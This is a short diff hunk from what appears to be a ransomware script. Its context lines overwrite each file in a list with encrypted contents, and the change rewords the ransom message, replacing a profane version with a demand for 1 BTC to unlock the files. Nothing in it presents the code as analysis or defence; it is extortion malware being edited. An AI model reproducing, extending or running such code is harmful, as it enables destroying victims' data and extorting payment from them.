@@ -28,4 +28,4 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
 
-print("All your ARE FUCKED send 1 BTC to unlock your files")
+print("Your files are encrypted send 1 BTC to unlock your files")
